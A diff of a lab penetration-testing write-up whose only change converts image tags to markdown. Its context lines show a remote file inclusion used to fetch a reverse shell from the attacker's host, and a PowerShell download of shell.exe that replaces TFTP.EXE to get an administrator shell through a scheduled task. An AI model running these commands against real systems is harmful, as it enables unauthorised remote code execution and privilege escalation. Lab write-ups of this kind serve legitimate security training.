@@ -36,7 +36,7 @@ Does not allow anonymous logins.
 
 Port 4443 and 8080 host the same service:
 
-<figure><img src="../../../.gitbook/assets/image (3107).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3107).png>)
 
 I ran a `gobuster` scan on the site and found a few directories:
 
@@ -63,11 +63,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The `/site` directory contained a basic corporate page, but the most interesting part was the URL:
 
-<figure><img src="../../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(651).png>)
 
 This looks like it's vulnerable to a file inclusion exploit. I tested this and it is RFI for this case:
 
-<figure><img src="../../../.gitbook/assets/image (2386).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2386).png>)
 
 We can grab a PHP Reverse shell for Windows from this page:
 
@@ -79,7 +79,7 @@ Afterwards, we just need to execute it:
 $ curl http://192.168.233.53:8080/site/index.php?page=http://192.168.45.161/rev.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2300).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2300).png>)
 
 We can then grab the user flag.
 
@@ -149,6 +149,6 @@ powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE
 
 After a few minutes, the task would execute and give us a administrator reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (2503).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2503).png>)
 
 Rooted!
